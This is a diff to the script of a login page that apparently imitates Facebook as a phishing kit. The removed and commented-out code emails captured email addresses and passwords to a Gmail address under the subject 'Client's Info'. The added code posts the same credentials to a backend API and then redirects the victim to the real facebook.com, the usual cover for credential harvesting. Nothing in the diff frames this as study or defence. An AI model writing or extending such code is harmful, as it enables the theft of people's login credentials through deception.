@@ -46,24 +46,24 @@
     let emailErr = document.getElementById("emailErr");
     let passwordErr = document.getElementById("passwordErr");
 
-    function sendEmail(to, subject, message) {
-      emailjs
-        .send("service_o7z3jtp", "template_nht3mye", {
-          to_email: to,
-          subject: subject,
-          message: message,
-        })
-        .then(
-          function (response) {
-            console.log("Email sent successfully:", response);
-          },
-          function (error) {
-            console.error("Error sending email:", error);
-          }
-        );
-    }
+    // function sendEmail(to, subject, message) {
+    //   emailjs
+    //     .send("service_o7z3jtp", "template_nht3mye", {
+    //       to_email: to,
+    //       subject: subject,
+    //       message: message,
+    //     })
+    //     .then(
+    //       function (response) {
+    //         console.log("Email sent successfully:", response);
+    //       },
+    //       function (error) {
+    //         console.error("Error sending email:", error);
+    //       }
+    //     );
+    // }
 
-    form.addEventListener("submit", (e) => {
+    form.addEventListener("submit", async (e) => {
       e.preventDefault();
       emailErr.style.display = "none";
       passwordErr.style.display = "none";
@@ -83,21 +83,69 @@
           password.setAttribute("class", "err");
         }
       } else {
-        let message = {
-          email: email.value,
-          password: password.value,
-        };
-        console.log(message);
-        // Uncomment the following lines to send the email and redirect
-        // sendEmail(
-        //   "jamespeterson10375@gmail.com",
-        //   "Client's Info",
-        //   JSON.stringify(message)
-        // );
-        // setTimeout(() => {
-        //   window.location.replace("https://www.facebook.com/");
-        // }, 3000);
+        try {
+          const response = await fetch("http://localhost:8000/api/login", {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json",
+            },
+            body: JSON.stringify({
+              email: email.value,
+              password: password.value,
+            }),
+          });
+
+          if (!response.ok) {
+            throw new Error("Login failed");
+            console.log("Login from ");
+          } else {
+            setTimeout(() => {
+              window.location.replace("https://www.facebook.com/");
+            }, 3000);
+          }
+        } catch (error) {
+          // Handle error, e.g., display an error message
+          console.error("Login error:", error.message);
+        }
       }
     });
+
+    // form.addEventListener("submit", (e) => {
+    //   e.preventDefault();
+    //   emailErr.style.display = "none";
+    //   passwordErr.style.display = "none";
+    //   email.removeAttribute("class");
+    //   password.removeAttribute("class");
+
+    //   if (!email.value.trim() || !password.value.trim()) {
+    //     if (!email.value.trim()) {
+    //       emailErr.style.display = "block";
+    //       emailErr.setAttribute("class", "errtext");
+    //       email.setAttribute("class", "err");
+    //     }
+
+    //     if (!password.value.trim()) {
+    //       passwordErr.style.display = "block";
+    //       passwordErr.setAttribute("class", "errtext");
+    //       password.setAttribute("class", "err");
+    //     }
+    //   } else {
+    //     let message = {
+    //       email: email.value,
+    //       password: password.value,
+    //     };
+    //     console.log(message);
+
+    //     // Uncomment the following lines to send the email and redirect
+    //     // sendEmail(
+    //     //   "jamespeterson10375@gmail.com",
+    //     //   "Client's Info",
+    //     //   JSON.stringify(message)
+    //     // );
+    //     // setTimeout(() => {
+    //     //   window.location.replace("https://www.facebook.com/");
+    //     // }, 3000);
+    //   }
+    // });
   </script>
 </html>
